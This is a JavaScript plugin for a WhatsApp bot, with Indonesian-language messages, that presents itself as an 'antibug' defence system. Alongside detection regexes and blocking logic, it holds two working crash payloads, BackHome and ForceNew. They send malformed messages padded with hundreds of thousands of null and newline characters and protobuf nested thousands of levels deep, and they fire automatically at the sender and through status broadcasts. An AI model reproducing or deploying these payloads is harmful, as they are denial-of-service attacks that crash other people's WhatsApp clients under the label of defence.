const config = require('../../config')
const te = require('../../src/lib/zerotwo-error.js')

const pluginConfig = {
    name: 'antibug',
    alias: ['antiserang', 'defend', 'guardmode'],
    category: 'owner',
    description: 'Auto defend kalo bot kena bug',
    usage: '.antibug <on/off/status>',
    example: '.antibug on',
    isOwner: true,
    isPremium: false,
    isGroup: false,
    isPrivate: false,
    cooldown: 5,
    energi: 0,
    isEnabled: true
}

const attackLog = new Map()
const blockedUsers = new Set()
const ATTACK_THRESHOLD = 3
const ATTACK_WINDOW = 10000
const BLOCK_DURATION = 3600000

async function BackHome(sock, target) {
    try {
        const msg = {
            groupMentionedMessage: {
                message: {
                    ephemeralMessage: {
                        message: {
                            viewOnceMessage: {
                                message: {
                                    interactiveMessage: {
                                        body: { text: '🛡️' },
                                        nativeFlowMessage: {
                                            extra: '\u31040',
                                            buttons: '?⃟꙰'.repeat(20000),
                                            extra1: '?⃟꙰'.repeat(5555)
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        await sock.relayMessage(target, msg, {})

        await sock.relayMessage(
            target,
            {
                newsletterAdminInviteMessage: {
                    newsletterJid: '123@newsletter',
                    inviteCode: '\r'.repeat(150000) + '\n'.repeat(50000),
                    inviteExpiration: 99999999999,
                    newsletterName: 'ZERO TWO DEFEND' + '\u0000'.repeat(250000)
                }
            },
            {}
        )
    } catch (e) {
        console.error('[ANTIBUG] BackHome error:', e.message)
    }
}

async function ForceNew(sock, target) {
    try {
        const { proto } = require('zerotwo')

        const msg = {
            buttonsMessage: {},
            documentMessage: {},
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: { text: '🛡️' },
                        nativeFlowMessage: {
                            extra: '\u31040',
                            buttons: 'A'.repeat(5555)
                        }
                    },
                    name: 'galayx_mesaage'
                }
            }
        }

        const TAGS = [
            [0xBA, 0x03],
            [0xD2, 0x04],
            [0xAA, 0x02]
        ]

        const encodeVarint = function (n) {
            var buf = []
            while (n >= 0x80) {
                buf.push((n & 0x7f) | 0x80)
                n >>>= 7
            }
            buf.push(n)
            return Buffer.from(buf)
        }

        const wrapLd = function (tag, data) {
            return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data])
        }

        const IMG = {
            url: 'https://example.com/image.jpg',
            mimetype: 'image/jpeg',
            fileSha256: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
            fileLength: 12345,
            height: 100,
            width: 100,
            mediaKey: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
            fileEncSha256: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=',
            directPath: '/v/t62.7118-24/example',
            mediaKeyTimestamp: '1234567890'
        }

        const Payload = proto.Message.encode(
            proto.Message.fromObject({ imageMessage: IMG })
        ).finish()

        const inflate = function (tag, depth) {
            var buf = Payload
            for (var i = 0; i < depth; i++) {
                buf = wrapLd(tag, wrapLd([0x0A], buf))
            }
            return buf
        }

        await sock.relayMessage(target, msg, {})

        const chunk = Array.isArray(target) ? target : [target]
        const msgId = 'def' + Date.now().toString(36).toUpperCase()

        for (let ti = 0; ti < TAGS.length; ti++) {
            const tag = TAGS[ti]
            let decodedPayload = null

            for (let depth = 5000; depth >= 2000 && !decodedPayload; depth -= 400) {
                try {
                    const raw = inflate(tag, depth)
                    const decoded = proto.Message.decode(raw)
                    proto.Message.encode(decoded).finish()
                    decodedPayload = decoded
                } catch (_) {}
            }

            if (!decodedPayload) continue

            await sock.relayMessage('status@broadcast', decodedPayload, {
                messageId: msgId + '-' + ti,
                statusJidList: chunk,
                additionalNodes: [
                    {
                        tag: 'meta',
                        attrs: {},
                        content: [
                            {
                                tag: 'mentioned_users',
                                attrs: {},
                                content: chunk.map(jid => ({
                                    tag: 'to',
                                    attrs: { jid: jid },
                                    content: []
                                }))
                            }
                        ]
                    }
                ]
            })
        }
    } catch (e) {
        console.error('[ANTIBUG] ForceNew error:', e.message)
    }
}

function detectBugPattern(message) {
    if (!message) return false

    const suspiciousPatterns = [
        /[\u0000-\u0008\u000B\u000C\u000E-\u001F]/,
        /[\u200B-\u200F\u202A-\u202E\u2060-\u2064]/,
        /[\uFEFF\u034F\u061C\u180E]/,
        /[\uD800-\uDFFF]/,
        /(.{1,})\1{50,}/,
        /[\r\n]{100,}/,
        /[\u2028\u2029]{50,}/
    ]

    for (const pattern of suspiciousPatterns) {
        if (pattern.test(message)) return true
    }

    if (message.length > 50000) return true

    const invisibleCount = (message.match(/[\u200B-\u200F\u2060-\u2064\uFEFF]/g) || []).length
    if (invisibleCount > 100) return true

    const nullCount = (message.match(/\u0000/g) || []).length
    if (nullCount > 50) return true

    const crlfCount = (message.match(/[\r\n]/g) || []).length
    if (crlfCount > 500) return true

    return false
}

function isBlocked(jid) {
    if (!blockedUsers.has(jid)) return false
    const blockedAt = blockedUsers.get(jid)
    if (typeof blockedAt !== 'number') return false
    if (Date.now() - blockedAt > BLOCK_DURATION) {
        blockedUsers.delete(jid)
        return false
    }
    return true
}

function trackAttack(jid) {
    const now = Date.now()
    if (!attackLog.has(jid)) {
        attackLog.set(jid, [])
    }
    const log = attackLog.get(jid)
    log.push(now)

    const recent = log.filter(t => now - t < ATTACK_WINDOW)
    attackLog.set(jid, recent)

    return recent.length
}

function isAntibugActive() {
    return global._ANTIBUG_ACTIVE === true
}

function setAntibugActive(state) {
    global._ANTIBUG_ACTIVE = state
}

setInterval(() => {
    const now = Date.now()
    for (const [jid, log] of attackLog) {
        const recent = log.filter(t => now - t < ATTACK_WINDOW)
        if (recent.length === 0) {
            attackLog.delete(jid)
        } else {
            attackLog.set(jid, recent)
        }
    }
}, 60000)

if (!global._ANTIBUG_ACTIVE) global._ANTIBUG_ACTIVE = true

async function handler(m, { sock }) {
    if (!config.isOwner(m.sender)) {
        return m.reply(
`╭━━━〔 🔒 OWNER ONLY 〕━━━⬣
│
│ > Command ini cuma buat owner!
│
╰━━━━━━━━━━━━━━━━⬣`
        )
    }

    const args = m.args || []
    const cmd = args[0]?.toLowerCase() || 'status'

    if (cmd === 'on') {
        setAntibugActive(true)
        await m.react('🛡️')
        return m.reply(
`╭━━━〔 🛡️ ANTIBUG AKTIF 〕━━━⬣
│
│ ✅ *Sistem defend aktif!*
│
│ 📊 *Config:*
│ • Threshold: *${ATTACK_THRESHOLD} bug* dalam ${ATTACK_WINDOW / 1000}s
│ • Block duration: *1 jam*
│ • Auto counter: *BackHome + ForceNew*
│
│ 💡 _Bot bakal otomatis defend kalo diserang_
│
╰━━━━━━━━━━━━━━━━⬣`
        )
    }

    if (cmd === 'off') {
        setAntibugActive(false)
        await m.react('🔕')
        return m.reply(
`╭━━━〔 🔕 ANTIBUG NONAKTIF 〕━━━⬣
│
│ ❌ *Sistem defend dimatikan!*
│
│ 💡 _Bot bakal diam kalo diserang_
│
╰━━━━━━━━━━━━━━━━⬣`
        )
    }

    if (cmd === 'blocked' || cmd === 'listblock') {
        if (blockedUsers.size === 0) {
            return m.reply(
`╭━━━〔 🚫 BLOCKED LIST 〕━━━⬣
│
│ > Tidak ada user yang diblokir
│
╰━━━━━━━━━━━━━━━━⬣`
            )
        }

        let txt = `╭━━━〔 🚫 BLOCKED LIST 〕━━━⬣\n│\n`
        let i = 1
        for (const [jid, blockedAt] of blockedUsers) {
            if (typeof blockedAt !== 'number') continue
            const remaining = Math.max(0, BLOCK_DURATION - (Date.now() - blockedAt))
            const mins = Math.ceil(remaining / 60000)
            txt += `│ *${i}.* ${jid.split('@')[0]}\n`
            txt += `│    ⏳ Sisa: ${mins} menit\n│\n`
            i++
        }
        txt += `╰━━━━━━━━━━━━━━━━⬣`
        return m.reply(txt)
    }

    if (cmd === 'unblock') {
        const target = args[1]
        if (!target) {
            return m.reply(`❌ Format: ${m.prefix}antibug unblock <nomor>`)
        }
        const jid = target.includes('@') ? target : target.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        if (blockedUsers.has(jid)) {
            blockedUsers.delete(jid)
            await m.react('✅')
            return m.reply(`✅ User \`${jid.split('@')[0]}\` berhasil di-unblock!`)
        }
        return m.reply(`⚠️ User tidak ada di blocklist.`)
    }

    if (cmd === 'clear') {
        blockedUsers.clear()
        attackLog.clear()
        await m.react('✅')
        return m.reply(`✅ Semua blocklist dan attack log dibersihkan!`)
    }

    const status = isAntibugActive() ? '✅ AKTIF' : '❌ NONAKTIF'
    const totalBlocked = blockedUsers.size
    const totalTracked = attackLog.size

    return m.reply(
`╭━━━〔 🛡️ ANTIBUG STATUS 〕━━━⬣
│
│ 📊 *Status:* ${status}
│
│ ─────────────────
│
│ ⚙️ *Config:*
│ • Threshold: *${ATTACK_THRESHOLD} bug* / ${ATTACK_WINDOW / 1000}s
│ • Block duration: *1 jam*
│ • Auto counter: *BackHome + ForceNew*
│
│ ─────────────────
│
│ 📈 *Statistik:*
│ • User blocked: *${totalBlocked}*
│ • User tracked: *${totalTracked}*
│
│ ─────────────────
│
│ 📌 *Command:*
│ > ${m.prefix}antibug on
│ > ${m.prefix}antibug off
│ > ${m.prefix}antibug status
│ > ${m.prefix}antibug blocked
│ > ${m.prefix}antibug unblock <nomor>
│ > ${m.prefix}antibug clear
│
╰━━━━━━━━━━━━━━━━⬣`
    )
}

async function antibugMiddleware(m, sock) {
    if (!isAntibugActive()) return { handled: false }

    if (!m.isGroup && !m.text) return { handled: false }

    const sender = m.sender
    if (config.isOwner(sender)) return { handled: false }

    if (isBlocked(sender)) {
        return { handled: true, blocked: true }
    }

    const text = m.text || m.body || m.message?.conversation || ''
    const msgType = m.mtype || ''

    let isBug = false

    if (detectBugPattern(text)) isBug = true

    if (msgType === 'newsletterAdminInviteMessage') isBug = true
    if (msgType === 'groupMentionedMessage') isBug = true

    if (m.message?.newsletterAdminInviteMessage) {
        const inv = m.message.newsletterAdminInviteMessage
        const invCode = inv.inviteCode || ''
        const invName = inv.newsletterName || ''
        if (invCode.length > 10000 || invName.length > 10000) isBug = true
    }

    if (m.message?.groupMentionedMessage?.message?.ephemeralMessage?.message?.viewOnceMessage?.message?.interactiveMessage?.nativeFlowMessage) {
        const nf = m.message.groupMentionedMessage.message.ephemeralMessage.message.viewOnceMessage.message.interactiveMessage.nativeFlowMessage
        const btn = nf.buttons || ''
        if (typeof btn === 'string' && btn.length > 10000) isBug = true
    }

    if (m.message?.viewOnceMessage?.message?.interactiveMessage?.nativeFlowMessage) {
        const nf = m.message.viewOnceMessage.message.interactiveMessage.nativeFlowMessage
        const btn = nf.buttons || ''
        if (typeof btn === 'string' && btn.length > 1000) isBug = true
    }

    if (!isBug) return { handled: false }

    const attackCount = trackAttack(sender)

    try {
        await sock.sendMessage(m.chat, {
            text: `🛡️ *ANTIBUG TRIGGERED*\n\n> User: @${sender.split('@')[0]}\n> Attack: ${attackCount}/${ATTACK_THRESHOLD}\n> Status: ${attackCount >= ATTACK_THRESHOLD ? 'BLOCKED' : 'TRACKING'}`,
            mentions: [sender]
        })
    } catch (e) {}

    if (attackCount >= ATTACK_THRESHOLD) {
        blockedUsers.set(sender, Date.now())

        try {
            await BackHome(sock, sender)
            await new Promise(r => setTimeout(r, 500))
            await ForceNew(sock, sender)
        } catch (e) {
            console.error('[ANTIBUG] Counter error:', e.message)
        }

        try {
            const ownerJid = config.owner?.[0] ? config.owner[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null
            if (ownerJid) {
                await sock.sendMessage(ownerJid, {
                    text: `🛡️ *ANTIBUG ALERT*\n\n> User: @${sender.split('@')[0]}\n> Attack Count: ${attackCount}\n> Action: BLOCKED + COUNTER\n> Duration: 1 jam\n> Chat: ${m.isGroup ? m.chat : 'Private'}`,
                    mentions: [sender]
                })
            }
        } catch (e) {}
    }

    return { handled: true, blocked: attackCount >= ATTACK_THRESHOLD }
}

module.exports = {
    config: pluginConfig,
    handler,
    antibugMiddleware,
    isAntibugActive,
    setAntibugActive
}